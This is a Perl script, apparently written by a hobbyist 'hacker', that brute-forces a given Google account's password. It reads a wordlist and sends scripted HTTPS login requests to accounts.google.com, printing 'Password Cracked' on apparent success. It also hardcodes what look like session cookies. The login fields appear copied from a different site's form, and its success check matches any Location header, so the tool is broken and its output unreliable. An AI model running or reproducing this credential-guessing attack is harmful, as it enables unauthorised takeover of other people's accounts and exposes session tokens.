#!/usr/bin/perl
#

use strict;
use Net::SSLeay::Handle;

if(!defined($ARGV[0] && $ARGV[1])) {

system('clear');
print "**                               Version 1.00 \n";
print "                                     \n";
print "II       M M   M M       EEEEEEE   EEEEEEE  \n";
print "II      M M M M M M      EE        EE        \n";
print "II     M M  M M  M M     EEEEEEE   EEEEEEE    \n";
print "II    M M         M M    EE        EE          \n";
print "II   M M           M  M  EEEEEEE   EEEEEEE     \n";

print "\033[1;31m          ======================================================\n";
print "\033[1;37m               Usage: IMEE HACKER                  \n";
print "\033[1;31m          ======================================================  \n";
print "\n";
print "\n";
print "\n";
print "\n";
print "\n";
print "\n";
exit; }

my $user = $ARGV[0];
my $wordlist = $ARGV[1];

open (LIST, $wordlist) || die "\n[-] Can't find/open $wordlist\n";


print "**                              Version 1.00         \n";
print "                                                      \n";
print "II       M    M        EEEEE     EEEEE                \n";
print "II      M M  M M       E         E                    \n";
print "II     M   M    M      EEEEE     EEEEE                \n";
print "II    M          M     E         E                     \n";
print "II   M            M    EEEEE     EEEEE                   \n";


print "\033[1;31m          ======================================================\n";
print "\033[1;33m                            made by [[Z hacker]]                 \n";
print "\033[1;31m         ========================================================\n";

print "\033[1;39m\n [+] Cracking Started on: $user ...\n\n";
print "=======================================\n";

while (my $password = <LIST>) {
chomp ($password);
$password =~ s/([^^A-Za-z0-9\-_.!~*@'()])/ sprintf "%%%0x", ord $1 /eg;

my $a = "POST /login.php HTTP/1.1";
my $b = "Host: accounts.google.com";
my $c = "Connection: close";
my $e = "Cache-Control: max-age=0";
my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
my $g = "Origin: https://accounts.google.com";
my $h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31";
my $i = "Content-Type: application/x-www-form-urlencoded";
my $j = "Accept-Encoding: gzip,deflate,sdch";
my $k = "Accept-Language: Language: en-US,en;q=0.5";
my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";

my $cookie = "cookie: GAPS=1:cfsONp2r-xi2PpE6XvB9dHp7F1erdh88HiiqbKKX2JGwAL_asSyuPoeueBWuhGAKWtR7OUbA7VqW8zh4RJkUNxwbUyyhDg:h91RxWaSNGiqjt_Z; ACCOUNT_CHOOSER=AFx_qI6z9Gtyy7U6IFSRdOq88FrPBBkZe01wLhS4GuDVAxGyG8jX8Zl5obpyA4DUyHqrmPn6CmAEd5RWJISuzknsqxxtE722wJZVmBsJD0dwo5QmJ3_dAq-HFnt_CoGQqnyGcwiACpP2; NID=124=V5JmjiS-hQph3BTbeaOzt5PG15WR82ZROfXMzuGxjL-OH9-sz3C1pgtLvLWXnQ-0Zzcispvps0Z71DIJkd3XwONLxg0Ayx_KIXYIef57elFJHZ4renflXbuTMN6IM4HjAEJHUKhDDsurICGdZUkJdJrzKRUZR5w7l4hdjcqc9j60QMLO42FY-HJWZRSv394Q4NzVMDwv1uHACFYQhQQflthjK1tsYpluXWsGGomjMC--roZR612IXdFFBdI; 1P_JAR=2018-02-27-07; SMSV=ADHTe-Ayw1ToS19BPhIblkJCK9Pfg148P10vScJVks65x2Teu6OrVnjZg7GXMZMGnFTgxspKc3cdUEuODBcyQDbWf9UvnVSn65yyylrZrICrXcWRRTj3YEo; SID=0AUcxktAHAb2WM-shn8MWx_mG7ZycxEDmWCY3WCaZq9OYPnLf5rg1QyvInj0CJx6xxekEA.; LSID=doritos|mail|o.mail.google.com|o.notifications.google.com|s.IN|s.youtube:0AUcxoLmHe2grGPO15n3Pdd622oGKai1swkBf3iuINHOzx3egQJDmWITf4TyOgBxKz56wA.; HSID=ALSTjtllke8eTdc6A; SSID=Ab0BEp-twtg2Aa-MV; APISID=lrBytBKNliiZ7XGS/AZ1hlkScAtgW1FfqP; SAPISID=xcaTTQz33F0uRWZl/A_M3ayTMPtxPFdp1S; OGP=-5061451:; SIDCC=AAiTGe8tg-k2e-1qyCirrxKMN5Yd4Z8pAO9_ker-E-3_DgRgZS2qc07CDmEJzgZoPJXI9S_6Kos
Connection: keep-alive";
my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$user&pass=$password&default_persistent=0&login=Log+In";
my $cl = length($post);
my $d = "Content-Length: $cl";


my ($host, $port) = ("accounts.google.com", 443);

tie(*SSL, "Net::SSLeay::Handle", $host, $port);
  

print SSL "$a\n";
print SSL "$b\n";
print SSL "$c\n";
print SSL "$d\n";
print SSL "$e\n";
print SSL "$f\n";
print SSL "$g\n";
print SSL "$h\n";
print SSL "$i\n";
print SSL "$j\n";
print SSL "$k\n";
print SSL "$l\n";
print SSL "$cookie\n\n";

print SSL "$post\n";

my $success;
while(my $result = <SSL>){
if($result =~ /Location(.*?)/){
$success = $1;
}
}
if (!defined $success)
{
print "\033[1;31m[-] $password -> Failed \n";
close SSL;
}
else
{
print "\033[1;32m\n########################################################\n";
print "[+] \033[1;32mPassword Cracked: $password\n";
print "\033[1;32m########################################################\n\n";
close SSL;
exit;
}
}
